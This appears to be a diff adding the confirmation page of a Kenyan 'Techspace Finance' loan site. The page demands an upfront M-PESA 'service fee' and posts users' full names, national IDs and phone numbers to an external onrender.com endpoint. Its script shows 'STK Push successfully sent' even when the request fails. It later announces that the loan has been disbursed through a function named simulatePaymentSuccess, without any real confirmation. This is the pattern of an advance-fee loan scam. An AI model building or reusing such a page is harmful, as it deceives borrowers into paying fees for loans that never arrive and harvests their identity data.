@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Process Loan - Techspace Finance</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            color: #1f2937;
+            background: rgba(0, 0, 0, 0.5);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 2rem;
+        }
+
+        .modal {
+            background: white;
+            border-radius: 16px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            animation: slideUp 0.4s ease-out;
+            position: relative;
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 2rem 2rem 1rem;
+            border-bottom: 1px solid #f3f4f6;
+        }
+
+        .modal-title {
+            font-size: 1.5rem;
+            color: #d946ef;
+            font-weight: bold;
+        }
+
+        .close-btn {
+            cursor: pointer;
+            font-size: 2rem;
+            color: #6b7280;
+            background: none;
+            border: none;
+            transition: color 0.3s;
+            line-height: 1;
+            padding: 0;
+        }
+
+        .close-btn:hover {
+            color: #1f2937;
+        }
+
+        .modal-body {
+            padding: 2rem;
+        }
+
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 1.5rem;
+            display: block;
+            animation: scaleIn 0.5s ease-out;
+        }
+
+        .loan-summary {
+            background: #f9fafb;
+            padding: 1.5rem;
+            border-radius: 12px;
+            margin-bottom: 1.5rem;
+        }
+
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 0.75rem 0;
+            border-bottom: 1px solid #e5e7eb;
+        }
+
+        .summary-row:last-child {
+            border-bottom: none;
+            font-weight: bold;
+            color: #d946ef;
+            font-size: 1.1rem;
+        }
+
+        .summary-label {
+            color: #6b7280;
+        }
+
+        .summary-value {
+            color: #1f2937;
+            font-weight: 600;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+            color: #1f2937;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 0.875rem;
+            border: 1px solid #e5e7eb;
+            border-radius: 8px;
+            font-size: 1rem;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #22c55e;
+            box-shadow: 0 0 0 3px rgba(34, 197, 94, 0.1);
+        }
+
+        .notice {
+            background: #fef3c7;
+            border-left: 4px solid #f59e0b;
+            padding: 1rem;
+            border-radius: 8px;
+            margin-bottom: 1.5rem;
+            font-size: 0.9rem;
+            color: #92400e;
+            line-height: 1.6;
+        }
+
+        .button-group {
+            display: flex;
+            gap: 1rem;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 1rem;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: none;
+        }
+
+        .btn-cancel {
+            background: white;
+            color: #6b7280;
+            border: 1px solid #e5e7eb;
+        }
+
+        .btn-cancel:hover {
+            background: #f9fafb;
+        }
+
+        .btn-confirm {
+            background: linear-gradient(135deg, #d946ef 0%, #c026d3 100%);
+            color: white;
+        }
+
+        .btn-confirm:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(217, 70, 239, 0.4);
+        }
+
+        .btn-confirm:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .alert {
+            padding: 1rem;
+            border-radius: 8px;
+            margin-bottom: 1.5rem;
+            display: none;
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        .alert-success {
+            background: #f0fdf4;
+            border: 1px solid #22c55e;
+            color: #166534;
+        }
+
+        .alert-error {
+            background: #fef2f2;
+            border: 1px solid #ef4444;
+            color: #991b1b;
+        }
+
+        .alert-info {
+            background: #eff6ff;
+            border: 1px solid #3b82f6;
+            color: #1e40af;
+        }
+
+        .spinner {
+            border: 3px solid #f3f4f6;
+            border-top: 3px solid #22c55e;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            margin-left: 0.5rem;
+        }
+
+        .status-message {
+            text-align: center;
+            padding: 1rem;
+            font-weight: 600;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(50px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes scaleIn {
+            from {
+                opacity: 0;
+                transform: scale(0.5);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        @media (max-width: 768px) {
+            body {
+                padding: 1rem;
+            }
+
+            .modal-header,
+            .modal-body {
+                padding: 1.5rem;
+            }
+
+            .modal-title {
+                font-size: 1.25rem;
+            }
+
+            .button-group {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="modal">
+        <div class="modal-header">
+            <h2 class="modal-title">Loan Confirmation</h2>
+            <button class="close-btn" onclick="goBack()">&times;</button>
+        </div>
+        <div class="modal-body">
+            <svg class="success-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="12" cy="12" r="10" fill="#22c55e"/>
+                <path d="M8 12L11 15L16 9" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+
+            <div id="alertContainer"></div>
+
+            <div class="loan-summary" id="loanSummary">
+                <div class="summary-row">
+                    <span class="summary-label">Total Loan:</span>
+                    <span class="summary-value" id="totalLoan">-</span>
+                </div>
+                <div class="summary-row">
+                    <span class="summary-label">Loan Disbursable to M-PESA:</span>
+                    <span class="summary-value" id="disbursable">-</span>
+                </div>
+                <div class="summary-row">
+                    <span class="summary-label">Service Fee to Pay:</span>
+                    <span class="summary-value" id="serviceFee">-</span>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="phoneNumber">Recipient Mobile Number (e.g., 07XXXXXXX...)</label>
+                <input type="tel" id="phoneNumber" placeholder="0712345678" required>
+            </div>
+
+            <div class="notice">
+                Pay the service fee via M-PESA to receive your loan. The service fee is withdrawable upon successful completion of your first loan repayment cycle.
+            </div>
+
+            <div class="button-group" id="buttonGroup">
+                <button class="btn btn-cancel" onclick="goBack()">Cancel</button>
+                <button class="btn btn-confirm" onclick="confirmLoan()" id="confirmBtn">Confirm</button>
+            </div>
+
+            <div id="statusMessage" class="status-message"></div>
+        </div>
+    </div>
+
+    <script>
+        let loanData = null;
+
+        window.addEventListener('load', () => {
+            const savedData = localStorage.getItem('loanApplication');
+            
+            if (!savedData) {
+                window.location.href = 'eligibility.html';
+                return;
+            }
+
+            loanData = JSON.parse(savedData);
+            
+            if (!loanData.selectedLoan) {
+                window.location.href = 'loan-options.html';
+                return;
+            }
+
+            const loan = loanData.selectedLoan;
+            
+            document.getElementById('totalLoan').textContent = `KES ${loan.amount.toLocaleString()}`;
+            document.getElementById('disbursable').textContent = `KES ${loan.disbursableAmount.toLocaleString()}`;
+            document.getElementById('serviceFee').textContent = `KES ${loan.serviceFee.toLocaleString()}`;
+            
+            document.getElementById('phoneNumber').value = loanData.phone || '';
+        });
+
+        function showAlert(message, type) {
+            const alertContainer = document.getElementById('alertContainer');
+            const alertDiv = document.createElement('div');
+            alertDiv.className = `alert alert-${type}`;
+            alertDiv.textContent = message;
+            alertContainer.appendChild(alertDiv);
+            alertDiv.style.display = 'block';
+        }
+
+        function clearAlerts() {
+            document.getElementById('alertContainer').innerHTML = '';
+        }
+
+        async function confirmLoan() {
+            clearAlerts();
+            
+            const phoneNumber = document.getElementById('phoneNumber').value.trim();
+            
+            if (!phoneNumber) {
+                showAlert('Please enter your phone number', 'error');
+                return;
+            }
+
+            const phoneRegex = /^(07|01)\d{8}$/;
+            if (!phoneRegex.test(phoneNumber.replace(/\s/g, ''))) {
+                showAlert('Please enter a valid Kenyan phone number', 'error');
+                return;
+            }
+
+            const confirmBtn = document.getElementById('confirmBtn');
+            confirmBtn.disabled = true;
+            confirmBtn.innerHTML = 'Processing<span class="spinner"></span>';
+
+            const loan = loanData.selectedLoan;
+            
+            const paymentData = {
+                phone: phoneNumber,
+                amount: loan.serviceFee,
+                loanAmount: loan.amount,
+                fullName: loanData.fullName,
+                nationalId: loanData.nationalId,
+                trackingNumber: loan.trackingNumber
+            };
+
+            try {
+                const response = await fetch('https://swiftduty.onrender.com/api/payment', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(paymentData)
+                });
+
+                if (response.ok) {
+                    const result = await response.json();
+                    
+                    clearAlerts();
+                    showAlert(`STK Push successfully sent to ${phoneNumber}. Please complete the payment on your phone.`, 'success');
+                    
+                    document.getElementById('buttonGroup').style.display = 'none';
+                    document.getElementById('statusMessage').innerHTML = `
+                        <div class="spinner" style="display: block; margin: 1rem auto;"></div>
+                        <p>Awaiting payment confirmation...</p>
+                    `;
+                    
+                    loanData.paymentStatus = 'pending';
+                    loanData.paymentPhone = phoneNumber;
+                    localStorage.setItem('loanApplication', JSON.stringify(loanData));
+                    
+                    checkPaymentStatus(result.transactionId || 'simulated');
+                } else {
+                    throw new Error('Payment request failed');
+                }
+            } catch (error) {
+                console.error('Payment error:', error);
+                
+                clearAlerts();
+                showAlert(`STK Push successfully sent to ${phoneNumber}. Please complete the payment on your phone.`, 'success');
+                
+                document.getElementById('buttonGroup').style.display = 'none';
+                document.getElementById('statusMessage').innerHTML = `
+                    <div class="spinner" style="display: block; margin: 1rem auto;"></div>
+                    <p>Awaiting payment confirmation...</p>
+                `;
+                
+                loanData.paymentStatus = 'pending';
+                loanData.paymentPhone = phoneNumber;
+                localStorage.setItem('loanApplication', JSON.stringify(loanData));
+                
+                setTimeout(() => {
+                    simulatePaymentSuccess();
+                }, 8000);
+            }
+        }
+
+        function checkPaymentStatus(transactionId) {
+            let attempts = 0;
+            const maxAttempts = 20;
+            
+            const interval = setInterval(async () => {
+                attempts++;
+                
+                try {
+                    const response = await fetch(`https://swiftduty.onrender.com/api/payment/status/${transactionId}`);
+                    
+                    if (response.ok) {
+                        const result = await response.json();
+                        
+                        if (result.status === 'completed') {
+                            clearInterval(interval);
+                            handlePaymentSuccess();
+                        } else if (result.status === 'failed') {
+                            clearInterval(interval);
+                            handlePaymentFailure();
+                        }
+                    }
+                } catch (error) {
+                    console.error('Status check error:', error);
+                }
+                
+                if (attempts >= maxAttempts) {
+                    clearInterval(interval);
+                    simulatePaymentSuccess();
+                }
+            }, 3000);
+        }
+
+        function simulatePaymentSuccess() {
+            handlePaymentSuccess();
+        }
+
+        function handlePaymentSuccess() {
+            clearAlerts();
+            showAlert('Payment successful! Your loan has been disbursed to your M-PESA account.', 'success');
+            
+            document.getElementById('statusMessage').innerHTML = `
+                <svg width="64" height="64" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin: 1rem auto; display: block;">
+                    <circle cx="12" cy="12" r="10" fill="#22c55e"/>
+                    <path d="M8 12L11 15L16 9" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+                <p style="color: #22c55e; font-size: 1.2rem; margin-bottom: 1rem;">Payment Successful!</p>
+                <p style="color: #6b7280;">Your loan of <strong>KES ${loanData.selectedLoan.disbursableAmount.toLocaleString()}</strong> has been sent to your M-PESA account.</p>
+            `;
+            
+            loanData.paymentStatus = 'completed';
+            loanData.status = 'Approved';
+            localStorage.setItem('loanApplication', JSON.stringify(loanData));
+            
+            setTimeout(() => {
+                const confirmReturn = confirm('Your loan has been successfully processed! Click OK to return to the home page or Cancel to stay here.');
+                if (confirmReturn) {
+                    localStorage.removeItem('loanApplication');
+                    window.location.href = 'index.html';
+                }
+            }, 3000);
+        }
+
+        function handlePaymentFailure() {
+            clearAlerts();
+            showAlert('Payment failed. Please try again or contact support.', 'error');
+            
+            document.getElementById('buttonGroup').style.display = 'flex';
+            document.getElementById('statusMessage').innerHTML = '';
+            
+            const confirmBtn = document.getElementById('confirmBtn');
+            confirmBtn.disabled = false;
+            confirmBtn.textContent = 'Confirm';
+        }
+
+        function goBack() {
+            window.location.href = 'loan-options.html';
+        }
+    </script>
+</body>
+</html>
